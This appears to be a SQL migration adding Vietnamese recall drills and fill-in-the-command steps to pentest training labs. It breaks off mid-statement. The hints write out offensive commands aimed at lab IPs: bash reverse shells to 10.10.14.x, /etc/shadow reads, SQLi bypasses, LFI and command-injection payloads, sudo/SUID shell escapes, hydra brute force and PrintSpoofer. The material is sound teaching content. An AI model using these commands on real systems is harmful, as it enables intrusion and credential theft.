-- 0040_lab_extra_drills_and_quiz: additional recall-drill steps (flag/
-- parameter/URL-position memorization), 'fill in the command' steps, and
-- standalone quiz MCQs for all 13 existing labs, per user request to add
-- more practice per topic so learners keep drilling exact syntax.

UPDATE cards SET payload = jsonb_set(payload, '{steps}', (payload->'steps') || '[{"prompt": "In ra nội dung file /etc/shadow (chứa password hash, thường cần quyền root để đọc được).", "hint": "cat /etc/shadow", "patterns": ["cat\\s+/etc/shadow\\b"], "explanation": "/etc/shadow chứa hash mật khẩu của user (khác /etc/passwd chỉ chứa thông tin user, không có hash) — cùng cú pháp cat như đã luyện, chỉ đổi đường dẫn file."}, {"prompt": "Tìm theo tên CHÍNH XÁC ''config.php'' (phân biệt hoa/thường, không dùng -iname) trên toàn hệ thống, bỏ qua lỗi quyền.", "hint": "find / -name ''config.php'' 2>/dev/null", "patterns": ["find\\s+/\\s+-name\\s+.?config\\.php.?\\s+2>\\s*/dev/null"], "explanation": "-name tìm khớp chính xác hoa/thường, khác -iname (insensitive) đã dùng ở bước trước — vẫn giữ 2>/dev/null để lọc lỗi quyền."}, {"prompt": "Tìm chuỗi ''admin'' (không phân biệt hoa/thường) chỉ trong MỘT file cụ thể là notes.txt, không dùng *.txt.", "hint": "grep -i admin notes.txt", "patterns": ["grep\\s+-i\\s+admin\\s+notes\\.txt"], "explanation": "Cùng cờ -i như bước trước, nhưng chỉ định đúng 1 file (notes.txt) thay vì mọi file .txt bằng wildcard *.txt."}, {"prompt": "Hoàn thiện lệnh sau để liệt kê file chi tiết kèm file ẩn trong thư mục hiện tại: ls -__", "hint": "ls -la", "patterns": ["ls\\s+-la\\b", "ls\\s+-al\\b"], "explanation": "-l là long format (chi tiết), -a là all (kể cả file ẩn) — hai cờ này có thể gộp thành -la hoặc -al."}, {"prompt": "Hoàn thiện lệnh sau để tìm chuỗi ''root'' ngay trong file /etc/passwd: ____ root /etc/passwd", "hint": "grep root /etc/passwd", "patterns": ["grep\\s+root\\s+/etc/passwd\\b"], "explanation": "grep <chuỗi cần tìm> <file> là cú pháp cơ bản nhất, không cần cờ gì thêm khi tìm đúng 1 file, phân biệt hoa thường."}, {"prompt": "Hoàn thiện lệnh sau để cấp quyền thực thi cho file deploy.sh bằng ký hiệu SỐ (octal) thay vì +x: chmod ___ deploy.sh", "hint": "chmod 755 deploy.sh", "patterns": ["chmod\\s+7[0-7][0-7]\\s+deploy\\.sh"], "explanation": "chmod 755 (hoặc bất kỳ số có chữ số đầu là 7) cấp quyền rwx cho owner — số đầu tiên luôn phải cho phép thực thi (7, 5, 3, hoặc 1 ở vị trí thực thi) để owner chạy được file."}]'::jsonb, true)
WHERE kind = 'lab' AND front = 'Lab 1 — Làm quen lệnh Linux cơ bản';

UPDATE cards SET payload = jsonb_set(payload, '{steps}', (payload->'steps') || '[{"prompt": "Thay vì dùng -p-, quét toàn bộ 65535 cổng TCP của 10.10.10.5 bằng cú pháp dải cổng viết đầy đủ.", "hint": "nmap -p 1-65535 10.10.10.5", "patterns": ["nmap\\s+-p\\s*1-65535\\s+10\\.10\\.10\\.5"], "explanation": "-p- là cách viết tắt của -p 1-65535 — cả hai đều quét đủ toàn bộ dải cổng TCP, không chỉ top 1000 mặc định."}, {"prompt": "Chỉ chạy script NSE mặc định (-sC) trên cổng 22 của 10.10.10.5, KHÔNG kèm -sV (không lấy version service).", "hint": "nmap -sC -p 22 10.10.10.5", "patterns": ["nmap\\s+-sC\\s+-p\\s*22\\s+10\\.10\\.10\\.5", "nmap\\s+-p\\s*22\\s+-sC\\s+10\\.10\\.10\\.5"], "explanation": "-sC và -sV là hai cờ độc lập: -sC chỉ chạy script enum, -sV chỉ lấy version — có thể dùng riêng lẻ, không bắt buộc đi cùng nhau như ở bước trước."}, {"prompt": "Quét UDP top 50 cổng phổ biến (không phải 20) của 10.10.10.5, dùng đúng cú pháp --top-ports.", "hint": "nmap -sU --top-ports 50 10.10.10.5", "patterns": ["nmap\\s+-sU\\s+--top-ports\\s*[= ]?\\s*50\\s+10\\.10\\.10\\.5"], "explanation": "--top-ports <N> nhận một số N bất kỳ do người dùng chọn — giá trị 20 ở bước trước chỉ là ví dụ, không phải cố định."}, {"prompt": "Hoàn thiện lệnh để lưu kết quả quét sang cả 3 định dạng cùng lúc với tên file ''nmap_scan5'', dựa trên lệnh đã luyện: nmap -sC -sV -p 22,80 10.10.10.5 ____", "hint": "nmap -sC -sV -p 22,80 10.10.10.5 -oA nmap_scan5", "patterns": ["(?=.*nmap)(?=.*-oA\\s+nmap_scan5)(?=.*10\\.10\\.10\\.5).*"], "explanation": "-oA <basename> xuất cả 3 định dạng (normal/xml/grepable) với tên file gốc do bạn tự chọn, ở đây là nmap_scan5."}, {"prompt": "Hoàn thiện lệnh để quét CHỈ MỘT cổng duy nhất là 445 (SMB) của 10.10.10.5, bỏ qua mọi cổng khác: nmap -p ____ 10.10.10.5", "hint": "nmap -p 445 10.10.10.5", "patterns": ["nmap\\s+-p\\s*445\\s+10\\.10\\.10\\.5"], "explanation": "-p nhận trực tiếp một số cổng đơn lẻ (445), một danh sách (22,80) hoặc một dải (1-65535) — ở đây chỉ cần đúng 1 cổng."}, {"prompt": "Hoàn thiện lệnh ping sweep cho một subnet KHÁC, 10.10.20.0/24 (không phải 10.10.10.0/24 đã luyện): nmap -sn ____", "hint": "nmap -sn 10.10.20.0/24", "patterns": ["nmap\\s+-sn\\s+10\\.10\\.20\\.0/24"], "explanation": "-sn luôn đi kèm một dải subnet (CIDR) hoặc danh sách IP — cú pháp giống hệt bước đã luyện, chỉ đổi subnet."}]'::jsonb, true)
WHERE kind = 'lab' AND front = 'Lab 2 — Host discovery & quét cổng (nmap)';

UPDATE cards SET payload = jsonb_set(payload, '{steps}', (payload->'steps') || '[{"prompt": "Dò thêm các FILE có extension .php (không chỉ thư mục) bằng ffuf, dùng cùng wordlist common.txt.", "hint": "ffuf -w common.txt -u http://10.10.10.5/FUZZ -e .php", "patterns": ["ffuf\\s+-w\\s+common\\.txt\\s+-u\\s+http://10\\.10\\.10\\.5/FUZZ\\s+-e\\s+\\.php", "ffuf\\s+-u\\s+http://10\\.10\\.10\\.5/FUZZ\\s+-w\\s+common\\.txt\\s+-e\\s+\\.php"], "explanation": "-e .php thêm đuôi .php vào mỗi từ trong wordlist khi fuzz, giúp tìm ra file như admin.php thay vì chỉ thư mục /admin."}, {"prompt": "Làm lại việc dò thư mục bằng gobuster nhưng thêm extension .php,.txt vào cùng lệnh.", "hint": "gobuster dir -u http://10.10.10.5 -w common.txt -x php,txt", "patterns": ["gobuster\\s+dir\\s+-u\\s+http://10\\.10\\.10\\.5\\s+-w\\s+common\\.txt\\s+-x\\s+php,txt", "gobuster\\s+dir\\s+-w\\s+common\\.txt\\s+-u\\s+http://10\\.10\\.10\\.5\\s+-x\\s+php,txt"], "explanation": "-x là cờ của gobuster (tương đương -e của ffuf) để thêm danh sách extension cần thử vào mỗi từ trong wordlist."}, {"prompt": "Chạy nikto nhưng chỉ định rõ cổng 8080 (khác cổng mặc định 80) trên cùng host 10.10.10.5.", "hint": "nikto -h 10.10.10.5 -p 8080", "patterns": ["nikto\\s+-h\\s+10\\.10\\.10\\.5\\s+-p\\s*8080"], "explanation": "-p chỉ định cổng cho nikto khi target không chạy ở cổng mặc định 80/443 — vẫn giữ -h để chỉ định host."}, {"prompt": "Hoàn thiện lệnh curl sau để chỉ lấy HEADER của trang chủ (không lấy body): curl ____ http://10.10.10.5/", "hint": "curl -I http://10.10.10.5/", "patterns": ["curl\\s+-I\\s+http://10\\.10\\.10\\.5"], "explanation": "-I gửi HEAD request, chỉ trả về header — đây là cờ đứng ngay sau curl, trước URL."}, {"prompt": "Hoàn thiện lệnh gobuster sau, điền đúng cờ đứng NGAY TRƯỚC tên wordlist: gobuster dir -u http://10.10.10.5 ____ common.txt", "hint": "gobuster dir -u http://10.10.10.5 -w common.txt", "patterns": ["gobuster\\s+dir\\s+-u\\s+http://10\\.10\\.10\\.5\\s+-w\\s+common\\.txt"], "explanation": "-w (wordlist) luôn đứng ngay trước đường dẫn file wordlist, tương tự -w của ffuf."}, {"prompt": "Hoàn thiện lệnh nikto sau để quét đúng host http://10.10.10.5: nikto ____ http://10.10.10.5", "hint": "nikto -h http://10.10.10.5", "patterns": ["nikto\\s+-h\\s+http://10\\.10\\.10\\.5"], "explanation": "-h (host) là cờ bắt buộc của nikto để chỉ định target, đứng ngay trước URL/IP."}]'::jsonb, true)
WHERE kind = 'lab' AND front = 'Lab 3 — Web enumeration cơ bản';

UPDATE cards SET payload = jsonb_set(payload, '{steps}', (payload->'steps') || '[{"prompt": "Sau khi đã biết database ''app'' và bảng ''users'', lấy TOÀN BỘ tên COLUMN (không phải dữ liệu) của bảng users bằng sqlmap.", "hint": "sqlmap -u \"http://10.10.10.5/login.php?id=1\" -D app -T users --columns", "patterns": ["sqlmap\\s+.*-D\\s+app\\s+-T\\s+users\\s+--columns"], "explanation": "--columns liệt kê tên các cột của bảng đã chọn bằng -D/-T, thường chạy trước --dump để biết cột nào đáng chú ý (password, email...)."}, {"prompt": "Dùng sqlmap để lấy tên DATABASE hiện tại đang được ứng dụng sử dụng (không liệt kê tất cả database).", "hint": "sqlmap -u \"http://10.10.10.5/login.php?id=1\" --current-db", "patterns": ["sqlmap\\s+.*--current-db"], "explanation": "--current-db trả về đúng 1 database mà connection hiện tại của ứng dụng đang dùng, nhanh hơn --dbs khi chỉ cần biết database đang hoạt động."}, {"prompt": "Thử payload bypass đăng nhập qua trường username nhưng dùng dấu # (comment kiểu MySQL) thay cho --.", "hint": "admin''#", "patterns": ["admin''#"], "explanation": "Trong MySQL, # cũng là ký tự bắt đầu comment giống --, nên admin''# có tác dụng tương đương admin''-- để comment phần kiểm tra password phía sau."}, {"prompt": "Hoàn thiện lệnh sqlmap để lấy danh sách COLUMN của bảng users trong db app, giữ nguyên URL: sqlmap -u \"http://10.10.10.5/login.php?id=1\" -D app -T users ____", "hint": "sqlmap -u \"http://10.10.10.5/login.php?id=1\" -D app -T users --columns", "patterns": ["sqlmap\\s+.*-D\\s+app\\s+-T\\s+users\\s+--columns"], "explanation": "--columns là cờ cuối cùng cần thêm vào chuỗi -D/-T đã có, để liệt kê tên cột thay vì dump toàn bộ dữ liệu."}, {"prompt": "Hoàn thiện lệnh sqlmap để chỉ dump ĐÚNG record đầu tiên (giới hạn phạm vi dump), dùng --start và --stop: sqlmap -u \"http://10.10.10.5/login.php?id=1\" -D app -T users --dump ____", "hint": "sqlmap -u \"http://10.10.10.5/login.php?id=1\" -D app -T users --dump --start=1 --stop=1", "patterns": ["--start[= ]1.*--stop[= ]1", "--stop[= ]1.*--start[= ]1"], "explanation": "--start và --stop giới hạn khoảng record cần dump (ở đây chỉ record số 1 tới số 1), giúp giảm traffic khi bảng có hàng triệu dòng."}, {"prompt": "Hoàn thiện cú pháp URL để test SQLi bằng tay (không qua sqlmap), truyền payload trực tiếp vào tham số id: http://10.10.10.5/login.php?id=____", "hint": "http://10.10.10.5/login.php?id=1'' OR ''1''=''1", "patterns": ["login\\.php\\?id=1''\\s*or\\s*''1''\\s*=\\s*''1"], "explanation": "Tham số trong query string được nối ngay sau dấu =, không có khoảng trắng — payload SQLi được chèn trực tiếp vào giá trị của id."}]'::jsonb, true)
WHERE kind = 'lab' AND front = 'Lab 4 — SQL Injection (manual + sqlmap)';

UPDATE cards SET payload = jsonb_set(payload, '{steps}', (payload->'steps') || '[{"prompt": "Thử đọc /etc/passwd qua tham số page nhưng dùng DOUBLE URL-encode cho dấu / (encode %2f thành %252f), lặp lại đủ 4 cấp.", "hint": "..%252f..%252f..%252f..%252fetc%252fpasswd", "patterns": ["\\.\\.%252f.*etc%252fpasswd"], "explanation": "Double encoding (%252f thay vì %2f) đôi khi bypass được WAF/filter chỉ decode URL-encode một lần, trong khi server xử lý request lại decode hai lần."}, {"prompt": "Dùng PHP filter wrapper để đọc source code (base64) của file config.php (không phải /etc/passwd).", "hint": "php://filter/convert.base64-encode/resource=config.php", "patterns": ["php://filter.*convert\\.base64-encode.*resource=config\\.php"], "explanation": "resource= nhận đường dẫn file cần đọc source code, ở đây là config.php — một file PHP thường chứa thông tin nhạy cảm như DB credentials."}, {"prompt": "Nối lệnh command injection bằng ký tự | (pipe) thay vì ; hoặc &&, với IP thật 10.10.10.5.", "hint": "10.10.10.5 | whoami", "patterns": ["10\\.10\\.10\\.5\\s*\\|\\s*whoami"], "explanation": "| chuyển output của lệnh đầu (ping 10.10.10.5) làm input cho whoami và vẫn chạy whoami bất kể lệnh đầu thành công hay không — một biến thể khác bên cạnh ; và &&."}, {"prompt": "Hoàn thiện payload path traversal để đọc /etc/passwd với đúng 4 cấp ../ : ____", "hint": "../../../../etc/passwd", "patterns": ["\\.\\./\\.\\./\\.\\./\\.\\./etc/passwd"], "explanation": "Mỗi ../ thoát ra một cấp thư mục cha; cần đủ số lượng để ra khỏi web root rồi mới trỏ tới etc/passwd."}, {"prompt": "Hoàn thiện payload PHP filter wrapper, điền đúng scheme ở đầu: ____/convert.base64-encode/resource=index.php", "hint": "php://filter/convert.base64-encode/resource=index.php", "patterns": ["php://filter/convert\\.base64-encode/resource=index\\.php"], "explanation": "php://filter là scheme bắt buộc để kích hoạt stream filter của PHP, convert.base64-encode là tên filter cụ thể cần dùng."}, {"prompt": "Hoàn thiện lệnh command injection dùng &&, với IP thật 10.10.10.5 thay cho placeholder: 10.10.10.5 ____ whoami", "hint": "10.10.10.5 && whoami", "patterns": ["10\\.10\\.10\\.5\\s*&&\\s*whoami"], "explanation": "&& chỉ chạy whoami nếu lệnh ping tới 10.10.10.5 thành công (exit code 0) — cần một IP thật ở trước, không phải placeholder."}]'::jsonb, true)
WHERE kind = 'lab' AND front = 'Lab 5 — LFI & Command Injection';

UPDATE cards SET payload = jsonb_set(payload, '{steps}', (payload->'steps') || '[{"prompt": "Mở listener netcat ở cổng 9001 (khác cổng 4444 đã luyện) để tránh trùng cổng với lab khác.", "hint": "nc -nvlp 9001", "patterns": ["nc\\s+-nvlp\\s+9001", "nc\\s+-lvnp\\s+9001", "nc\\s+-nlvp\\s+9001"], "explanation": "Thứ tự chữ trong cụm cờ -nvlp không quan trọng (nc chấp nhận mọi hoán vị), chỉ cần đủ 4 cờ -n -v -l -p và số cổng đúng."}, {"prompt": "Gửi reverse shell bash tới một IP/cổng KHÁC: 10.10.14.2, cổng 9001.", "hint": "bash -i >& /dev/tcp/10.10.14.2/9001 0>&1", "patterns": ["bash\\s+-i\\s*>&\\s*/dev/tcp/10\\.10\\.14\\.2/9001\\s*0>&1"], "explanation": "Cú pháp /dev/tcp/<ip>/<port> giữ nguyên, chỉ thay IP và cổng theo đúng listener đang mở ở máy attacker."}, {"prompt": "Ngay sau khi nâng TTY bằng python pty.spawn, gõ lệnh để set biến môi trường TERM thành xterm (bước tiếp theo trong bộ 3 lệnh nâng full TTY).", "hint": "export TERM=xterm", "patterns": ["export\\s+TERM=xterm"], "explanation": "export TERM=xterm giúp các lệnh cần terminal thật (như clear, vim) hiển thị đúng — thường chạy ngay sau stty raw -echo và lệnh fg."}, {"prompt": "Hoàn thiện lệnh python3 để spawn pty, điền đúng tên module VÀ hàm: python3 -c ''import ____; ____.spawn(\"/bin/bash\")''", "hint": "python3 -c ''import pty; pty.spawn(\"/bin/bash\")''", "patterns": ["python3?\\s+-c\\s+.?import\\s+pty;\\s*pty\\.spawn\\(.?/bin/bash.?\\).?"], "explanation": "Module cần import là pty, và hàm cần gọi là pty.spawn() — cả hai chỗ trống đều điền ''pty''."}, {"prompt": "Hoàn thiện lệnh stty để set raw mode và tắt echo (2 tham số sau stty): stty ____", "hint": "stty raw -echo", "patterns": ["stty\\s+raw\\s+-echo"], "explanation": "raw tắt line-buffering/xử lý ký tự đặc biệt của terminal, -echo tắt việc hiển thị lại ký tự gõ — cả hai cần đi cùng nhau."}, {"prompt": "Hoàn thiện lệnh bash reverse shell, điền đúng đường dẫn thiết bị đặc biệt của bash dùng để mở kết nối TCP: bash -i >& ____/10.10.14.1/4444 0>&1", "hint": "bash -i >& /dev/tcp/10.10.14.1/4444 0>&1", "patterns": ["bash\\s+-i\\s*>&\\s*/dev/tcp/10\\.10\\.14\\.1/4444\\s*0>&1"], "explanation": "/dev/tcp là pseudo-device riêng của bash (không phải file thật), cho phép mở kết nối TCP chỉ bằng redirect, không cần nc hay python."}]'::jsonb, true)
WHERE kind = 'lab' AND front = 'Lab 6 — Reverse shell & nâng cấp TTY';

UPDATE cards SET payload = jsonb_set(payload, '{steps}', (payload->'steps') || '[{"prompt": "Tìm toàn bộ file có SGID bit (không phải SUID) trên hệ thống, bỏ qua lỗi quyền.", "hint": "find / -perm -2000 2>/dev/null", "patterns": ["find\\s+/\\s+-perm\\s+-2000\\s+2>\\s*/dev/null", "find\\s+/\\s+-perm\\s+-g=s\\s+2>\\s*/dev/null"], "explanation": "SGID (2000, hoặc -g=s) khiến file/thư mục chạy với quyền của GROUP owner, khác SUID (4000) là quyền của USER owner — cùng cú pháp find -perm, chỉ đổi giá trị."}, {"prompt": "Giả sử /usr/bin/vim có SUID bit. Theo GTFOBins, khai thác vim để mở shell ngay từ bên trong vim (không dùng find).", "hint": "vim -c '':!/bin/sh''", "patterns": ["vim\\s+-c\\s+.?:!\\s*/bin/sh.?"], "explanation": "vim -c ''<lệnh>'' chạy một lệnh vim ngay khi mở; :! chạy lệnh shell từ trong vim — nếu vim có SUID, shell spawn ra sẽ có quyền của owner file."}, {"prompt": "sudo -l cho thấy bạn được chạy /usr/bin/python3 với sudo không cần mật khẩu. Khai thác để spawn shell quyền root qua python3.", "hint": "sudo python3 -c \"import os; os.system(''/bin/sh'')\"", "patterns": ["sudo\\s+python3?\\s+-c\\s+.*os\\.system\\(.?/bin/sh.?\\)"], "explanation": "os.system() trong python3 chạy một lệnh shell con — vì toàn bộ tiến trình python3 chạy qua sudo, shell con này cũng chạy với quyền root."}, {"prompt": "Hoàn thiện lệnh find để tìm file có SUID bit, điền đúng giá trị octal: find / -perm -____ 2>/dev/null", "hint": "find / -perm -4000 2>/dev/null", "patterns": ["find\\s+/\\s+-perm\\s+-4000\\s+2>\\s*/dev/null"], "explanation": "4000 là giá trị octal của SUID bit — khác 2000 (SGID) hay 1000 (sticky bit)."}, {"prompt": "Hoàn thiện lệnh khai thác find theo GTFOBins để spawn shell giữ nguyên quyền effective của owner, điền đúng cờ: find . -exec /bin/sh ____ \\;", "hint": "find . -exec /bin/sh -p \\;", "patterns": ["find\\s+\\S+\\s+-exec\\s+/bin/sh\\s+-p\\s*\\\\?;"], "explanation": "-p (privileged) khiến /bin/sh giữ nguyên effective UID/GID thay vì tự hạ quyền xuống real UID của user gọi nó — nếu không có -p, việc spawn shell từ SUID binary sẽ không giữ được quyền root."}, {"prompt": "Hoàn thiện lệnh kiểm tra các quyền sudo của user hiện tại (2 từ): ____", "hint": "sudo -l", "patterns": ["sudo\\s+-l\\b"], "explanation": "sudo -l (list) hiển thị các lệnh user được phép chạy qua sudo, không chạy lệnh nào cả — chỉ liệt kê."}]'::jsonb, true)
WHERE kind = 'lab' AND front = 'Lab 7 — Linux Privilege Escalation';

UPDATE cards SET payload = jsonb_set(payload, '{steps}', (payload->'steps') || '[{"prompt": "Dùng smbclient để kết nối trực tiếp vào share có tên NETLOGON trên Domain Controller bằng null session.", "hint": "smbclient //10.10.10.100/NETLOGON -N", "patterns": ["smbclient\\s+//10\\.10\\.10\\.100/NETLOGON\\s+-N"], "explanation": "Thay vì -L (chỉ liệt kê share), bỏ -L và nêu thẳng đường dẫn share (//ip/SHARENAME) để kết nối/duyệt vào bên trong share đó."}, {"prompt": "Trong rpcclient (đã kết nối null session), chạy lệnh nội bộ để liệt kê các GROUP trong domain (thay vì user).", "hint": "rpcclient -U \"\" -N 10.10.10.100 -c \"enumdomgroups\"", "patterns": ["rpcclient\\s+.*-N.*10\\.10\\.10\\.100.*-c\\s+.?enumdomgroups.?", "rpcclient\\s+.*10\\.10\\.10\\.100.*-N.*-c\\s+.?enumdomgroups.?"], "explanation": "enumdomgroups là lệnh nội bộ của rpcclient tương tự enumdomusers nhưng liệt kê group thay vì user; -c cho phép chạy thẳng 1 lệnh không cần vào shell tương tác."}, {"prompt": "Chạy ldapsearch nhưng chỉ lấy đúng attribute sAMAccountName của mọi object (giới hạn output, không lấy toàn bộ attribute).", "hint": "ldapsearch -x -H ldap://10.10.10.100 -b \"dc=corp,dc=local\" sAMAccountName", "patterns": ["ldapsearch\\s+-x\\s+-H\\s+ldap://10\\.10\\.10\\.100\\s+-b\\s+.?dc=corp,dc=local.?\\s+sAMAccountName"], "explanation": "Attribute cần lấy được liệt kê ở CUỐI câu lệnh ldapsearch, sau -b <base DN> — ở đây chỉ yêu cầu trả về sAMAccountName thay vì mọi attribute."}, {"prompt": "Hoàn thiện lệnh smbclient để liệt kê share bằng null session, điền đúng cờ không-cần-mật-khẩu: smbclient -L //10.10.10.100 ____", "hint": "smbclient -L //10.10.10.100 -N", "patterns": ["smbclient\\s+-L\\s+//?10\\.10\\.10\\.100/?\\s+-N"], "explanation": "-N (no password) là cờ bắt buộc cho null session trong smbclient, luôn đặt ở cuối câu lệnh."}, {"prompt": "Hoàn thiện lệnh kerbrute, điền đúng SUBCOMMAND để dò username hợp lệ: kerbrute ____ -d corp.local --dc 10.10.10.100 users.txt", "hint": "kerbrute userenum -d corp.local --dc 10.10.10.100 users.txt", "patterns": ["kerbrute\\s+userenum\\s+-d\\s+corp\\.local\\s+--dc\\s+10\\.10\\.10\\.100\\s+users\\.txt"], "explanation": "userenum là subcommand của kerbrute chuyên để dò username qua Kerberos pre-auth — đứng ngay sau tên lệnh kerbrute."}, {"prompt": "Hoàn thiện lệnh bloodhound-python, điền đúng GIÁ TRỊ của cờ -c để thu thập TẤT CẢ loại dữ liệu: bloodhound-python -u user1 -p ''Password123!'' -d corp.local -ns 10.10.10.100 -c ____", "hint": "bloodhound-python -u user1 -p ''Password123!'' -d corp.local -ns 10.10.10.100 -c all", "patterns": ["bloodhound-python\\s+.*-c\\s+all"], "explanation": "-c all là giá trị đặc biệt yêu cầu thu thập mọi loại dữ liệu (user, group, session, ACL, trust...) — có thể thay bằng giá trị cụ thể như Group, Session nếu chỉ cần một loại."}]'::jsonb, true)
WHERE kind = 'lab' AND front = 'Lab 8 — Active Directory enumeration';

UPDATE cards SET payload = jsonb_set(payload, '{steps}', (payload->'steps') || '[{"prompt": "Brute-force SSH trên 10.10.10.5 nhưng với một DANH SÁCH username (users.txt) thay vì chỉ 1 username cố định, cùng wordlist passwords.txt.", "hint": "hydra -L users.txt -P passwords.txt ssh://10.10.10.5", "patterns": ["hydra\\s+-L\\s+users\\.txt\\s+-P\\s+passwords\\.txt\\s+ssh://10\\.10\\.10\\.5"], "explanation": "-L (viết hoa) nhận một FILE danh sách username, khác -l (viết thường) chỉ nhận ĐÚNG MỘT username cố định — hydra sẽ thử mọi cặp username/password trong 2 danh sách."}, {"prompt": "Crack hash NTLM (không phải MD5) trong file hash.txt bằng hashcat — đổi đúng số mode tương ứng.", "hint": "hashcat -m 1000 hash.txt rockyou.txt", "patterns": ["hashcat\\s+-m\\s*1000\\s+hash(es)?\\.txt\\s+rockyou\\.txt"], "explanation": "-m 1000 là mode của hashcat cho NTLM, khác -m 0 (MD5) đã dùng ở bước trước — mỗi loại hash có số mode riêng cần tra đúng."}, {"prompt": "Dùng john nhưng chỉ định rõ format NTLM bằng cờ --format (thay vì để john tự nhận diện format).", "hint": "john --format=NT --wordlist=rockyou.txt hash.txt", "patterns": ["john\\s+--format=NT\\s+--wordlist=?\\s*rockyou\\.txt\\s+hash(es)?\\.txt"], "explanation": "--format=NT ép john dùng đúng thuật toán NTLM thay vì tự đoán — cần thiết khi file hash chứa định dạng john không tự nhận ra đúng."}, {"prompt": "Hoàn thiện lệnh hydra, điền đúng cờ chỉ ĐÚNG MỘT username cố định (không phải danh sách): hydra ____ admin -P passwords.txt ssh://10.10.10.5", "hint": "hydra -l admin -P passwords.txt ssh://10.10.10.5", "patterns": ["hydra\\s+-l\\s+admin\\s+-P\\s+passwords\\.txt\\s+ssh://10\\.10\\.10\\.5"], "explanation": "-l (viết thường) nhận đúng 1 username cố định; -L (viết hoa) mới nhận file danh sách username."}, {"prompt": "Hoàn thiện lệnh hashcat, điền đúng số MODE cho hash MD5: hashcat -m ____ hash.txt rockyou.txt", "hint": "hashcat -m 0 hash.txt rockyou.txt", "patterns": ["hashcat\\s+-m\\s*0\\s+hash(es)?\\.txt\\s+rockyou\\.txt"], "explanation": "Mode 0 trong hashcat là MD5 — mỗi loại hash (NTLM=1000, SHA256=1400...) có số mode riêng, cần tra bảng mode chính xác."}, {"prompt": "Hoàn thiện lệnh john để chỉ XEM LẠI các mật khẩu đã crack thành công, không crack lại: john ____ hash.txt", "hint": "john --show hash.txt", "patterns": ["john\\s+--show\\s+hash(es)?\\.txt"], "explanation": "--show đọc file .pot (kết quả đã crack trước đó) và in lại cặp hash:password, không chạy crack mới."}]'::jsonb, true)
WHERE kind = 'lab' AND front = 'Lab 9 — Password attacks (hydra / hashcat / john)';

UPDATE cards SET payload = jsonb_set(payload, '{steps}', (payload->'steps') || '[{"prompt": "Để chọn thẳng window số 2 (không phải chuyển lần lượt bằng n/p), gõ prefix rồi gõ số mấy?", "hint": "Gõ: C-b 2  (hoặc: ctrl+b 2)", "patterns": ["^c-b\\s*2$", "^ctrl-b\\s*2$", "^ctrl\\+b\\s*2$"], "explanation": "C-b <số> nhảy thẳng tới window có đúng số thứ tự đó, nhanh hơn bấm n/p nhiều lần khi có nhiều window."}, {"prompt": "Để nhảy thẳng về window số 0 (window đầu tiên) từ bất kỳ window nào, gõ prefix rồi gõ số mấy?", "hint": "Gõ: C-b 0  (hoặc: ctrl+b 0)", "patterns": ["^c-b\\s*0$", "^ctrl-b\\s*0$", "^ctrl\\+b\\s*0$"], "explanation": "Cùng cơ chế C-b <số> như trên, chỉ khác số — window được đánh số bắt đầu từ 0 theo mặc định của tmux."}, {"prompt": "Để liệt kê toàn bộ session tmux đang chạy nền (không phải attach, chỉ xem danh sách), gõ lệnh gì TRỰC TIẾP trên terminal (không phải phím tắt trong tmux)?", "hint": "Gõ: tmux ls", "patterns": ["^tmux\\s+ls\\s*$", "^tmux\\s+list-sessions\\s*$"], "explanation": "tmux ls (viết tắt của tmux list-sessions) liệt kê tên và trạng thái mọi session đang chạy — hữu ích khi có nhiều session và cần biết attach vào session nào."}, {"prompt": "Hoàn thiện phím tắt để tạo window mới (prefix rồi phím nào): C-b ____", "hint": "C-b c", "patterns": ["^c-b\\s*c$", "^ctrl-b\\s*c$", "^ctrl\\+b\\s*c$"], "explanation": "c là phím tạo window mới sau prefix C-b."}, {"prompt": "Hoàn thiện lệnh gõ TRỰC TIẾP trên terminal (không qua phím tắt tmux) để gắn lại vào session cuối cùng: tmux ____", "hint": "tmux attach", "patterns": ["^tmux\\s+attach(-session)?\\s*$", "^tmux\\s+a\\s*$"], "explanation": "tmux attach (hoặc viết tắt tmux a) là lệnh shell bình thường, không phải phím tắt bên trong tmux."}, {"prompt": "Hoàn thiện phím tắt để chia pane theo chiều DỌC (pane mới nằm bên phải): C-b ____", "hint": "C-b %", "patterns": ["^c-b\\s*%$", "^ctrl-b\\s*%$", "^ctrl\\+b\\s*%$"], "explanation": "% (dấu phần trăm) là phím split-window theo chiều dọc; \" (dấu ngoặc kép) là chiều ngang."}]'::jsonb, true)
WHERE kind = 'lab' AND front = 'Lab 10 — tmux: thao tác window/pane nhanh';

UPDATE cards SET payload = jsonb_set(payload, '{steps}', (payload->'steps') || '[{"prompt": "Thay vì wmic (đang bị deprecate ở Windows mới), dùng PowerShell Get-CimInstance để liệt kê service cùng PathName.", "hint": "Get-CimInstance -ClassName Win32_Service | Select-Object Name,PathName,StartMode", "patterns": ["get-ciminstance\\s+-classname\\s+win32_service"], "explanation": "Get-CimInstance -ClassName Win32_Service là phiên bản PowerShell hiện đại của wmic service get, dùng cùng mục đích tìm unquoted service path."}, {"prompt": "Kiểm tra riêng các GROUP mà user hiện tại thuộc về (không phải privilege) bằng lệnh nào?", "hint": "whoami /groups", "patterns": ["whoami\\s+/groups"], "explanation": "whoami /groups liệt kê group membership (vd Administrators, Users...), khác whoami /priv chỉ liệt kê privilege (SeImpersonatePrivilege...)."}, {"prompt": "Dùng PrintSpoofer để chạy đúng 1 lệnh (whoami) với quyền SYSTEM, không mở shell tương tác (-i).", "hint": "PrintSpoofer64.exe -c whoami", "patterns": ["printspoofer\\S*\\s+-c\\s+whoami"], "explanation": "-c chỉ định lệnh cần chạy; bỏ -i (interactive) khi chỉ cần chạy một lệnh một lần và xem kết quả ngay, không cần mở cmd tương tác."}, {"prompt": "Hoàn thiện lệnh kiểm tra privilege hiện tại của user (2 từ + cờ): whoami ____", "hint": "whoami /priv", "patterns": ["whoami\\s+/priv"], "explanation": "/priv là tham số của whoami để liệt kê privilege, khác /groups (group) hoặc /user (thông tin user)."}, {"prompt": "Hoàn thiện lệnh PrintSpoofer để spawn cmd tương tác với quyền SYSTEM, điền đúng 2 cờ: PrintSpoofer64.exe ____ cmd", "hint": "PrintSpoofer64.exe -i -c cmd", "patterns": ["printspoofer\\S*\\s+-i\\s+-c\\s+cmd"], "explanation": "-i (interactive) giữ shell tương tác, -c cmd chỉ định lệnh cần chạy (ở đây là mở cmd) — cả hai cờ cần đi cùng để có shell SYSTEM tương tác."}, {"prompt": "Hoàn thiện lệnh wmic để liệt kê service kèm đường dẫn binary, điền đúng 3 field cách nhau bởi dấu phẩy: wmic service get ____", "hint": "wmic service get name,pathname,startmode", "patterns": ["wmic\\s+service\\s+get\\s+name,\\s*pathname,\\s*startmode"], "explanation": 